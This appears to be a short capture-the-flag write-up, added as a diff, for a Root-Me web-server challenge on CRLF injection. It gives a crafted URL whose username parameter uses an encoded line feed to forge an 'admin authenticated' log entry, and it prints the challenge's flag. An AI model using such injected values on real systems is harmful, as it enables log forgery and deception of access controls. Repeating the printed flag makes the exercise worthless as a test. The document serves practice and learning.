@@ -1,0 +1,10 @@
+Task on root-me: https://www.root-me.org/en/Challenges/Web-Server/CRLF
+Video Solution: https://www.youtube.com/watch?v=Kr-v0IGRTDs
+
+CRLF (Carriage return line feed)
+	Inject username dibawah user, ada 2 user admin dan guest 
+	http://challenge01.root-me.org/web-serveur/ch14/?username=admin%20authenticated.%0Aguest&password=admin
+	
+	Result Well done, you can validate challenge with this password : rFSP&G0p&5uAg1%
+
+	Flag : rFSP&G0p&5uAg1%
